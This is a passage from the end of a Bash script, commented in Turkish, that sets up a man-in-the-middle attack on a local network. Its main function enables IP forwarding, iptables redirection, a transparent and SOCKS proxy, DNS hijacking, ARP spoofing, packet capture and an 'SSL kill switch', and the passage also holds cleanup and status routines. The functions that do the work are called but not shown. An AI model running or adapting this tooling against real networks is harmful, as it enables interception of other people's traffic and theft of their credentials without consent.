        kill "$DNSMASQ_PID" 2>/dev/null
        print_status "Dnsmasq sonlandırıldı"
    fi
    
    if [ -n "$SOCKS_PROXY_PID" ]; then
        kill "$SOCKS_PROXY_PID" 2>/dev/null
        print_status "SOCKS proxy sonlandırıldı"
    fi
    
    # PID dosyalarından süreçleri sonlandır
    for pid_file in "$OUTPUT_DIR"/*.pid; do
        if [ -f "$pid_file" ]; then
            local pid=$(cat "$pid_file")
            kill "$pid" 2>/dev/null
            rm -f "$pid_file"
        fi
    done
    
    # Iptables kurallarını geri yükle
    if [ -f "$IPTABLES_BACKUP" ]; then
        print_status "Iptables kuralları geri yükleniyor..."
        iptables-restore < "$IPTABLES_BACKUP"
    else
        # Manuel temizlik
        iptables -t nat -F
        iptables -F
    fi
    
    # IP forwarding geri yükle
    if [ -n "$IP_FORWARD_ORIGINAL" ]; then
        echo "$IP_FORWARD_ORIGINAL" > /proc/sys/net/ipv4/ip_forward
        print_status "IP forwarding geri yüklendi"
    fi
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "Trafik yönlendirme ve MITM başlatılıyor..."
    echo
    
    # Parametreleri kontrol et
    validate_parameters
    
    # Gerekli araçları kontrol et
    check_dependencies
    
    # Çıktı dizinini hazırla
    setup_output_directory
    
    # Mevcut süreçleri sonlandır
    kill_existing_processes
    
    # Iptables yedekle
    backup_iptables
    
    # Parametreleri göster
    print_status "Trafik yönlendirme parametreleri:"
    echo -e "  ${CYAN}Arayüz:${NC} $INTERFACE"
    echo -e "  ${CYAN}Gateway IP:${NC} $GATEWAY_IP"
    echo -e "  ${CYAN}Ağ Aralığı:${NC} $NETWORK_RANGE"
    echo -e "  ${CYAN}Hedef IP:${NC} ${TARGET_IP:-"Tüm ağ"}"
    echo -e "  ${CYAN}Captive Portal:${NC} $CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
    echo -e "  ${CYAN}HTTP Yönlendirme:${NC} $([ "$REDIRECT_HTTP" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}HTTPS Yönlendirme:${NC} $([ "$REDIRECT_HTTPS" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}DNS Yönlendirme:${NC} $([ "$REDIRECT_DNS" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Engelleme Modu:${NC} $([ "$BLOCK_MODE" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}ARP Spoofing:${NC} $([ "$ARP_SPOOFING" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}DNS Hijacking:${NC} $([ "$DNS_HIJACK" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Paket Yakalama:${NC} $([ "$ENABLE_PACKET_CAPTURE" = true ] && echo "Evet" || echo "Hayır")"
    echo
    
    # Onay al (otomatik başlatma değilse)
    if [ "$AUTO_START" = false ]; then
        read -p "Trafik yönlendirmeyi başlatmak istiyor musunuz? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "İşlem iptal edildi"
            exit 0
        fi
    fi
    
    # IP forwarding etkinleştir
    enable_ip_forwarding
    
    # Domain listelerini oluştur
    create_domain_lists
    
    # Yönlendirme kurallarını ayarla
    setup_redirect_rules
    
    # Şeffaf proxy ayarla
    setup_transparent_proxy
    
    # SOCKS proxy başlat
    start_socks_proxy
    
    # DNS hijacking başlat
    start_dns_hijacking
    
    # ARP spoofing başlat
    start_arp_spoofing
    
    # Paket yakalama başlat
    start_packet_capture
    
    # SSL kill switch
    setup_ssl_kill_switch
    
    # Durum kontrolü
    check_status
    
    print_success "Trafik yönlendirme kurulumu tamamlandı!"
    
    echo
    print_status "Kullanım bilgileri:"
    echo -e "  ${CYAN}Log dosyası:${NC} $LOG_FILE"
    echo -e "  ${CYAN}Yakalama dosyası:${NC} $CAPTURE_FILE"
    echo -e "  ${CYAN}Yönlendirme log:${NC} $REDIRECT_LOG"
    echo -e "  ${CYAN}Durum kontrolü:${NC} $0 --status"
    echo -e "  ${CYAN}Trafik izleme:${NC} $0 --monitor"
    echo -e "  ${CYAN}Temizlik:${NC} $0 --cleanup"
    echo
    
    # Sürekli izleme (verbose modda)
    if [ "$VERBOSE" = true ]; then
        monitor_traffic
    fi
}

# Özel komutlar
if [ "$1" = "--status" ]; then
    # Sadece durum kontrolü
    check_status
    exit 0
elif [ "$1" = "--monitor" ]; then
    # Sadece trafik izleme
    monitor_traffic
    exit 0
elif [ "$1" = "--cleanup" ]; then
    # Sadece temizlik
    cleanup
    exit 0
fi

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main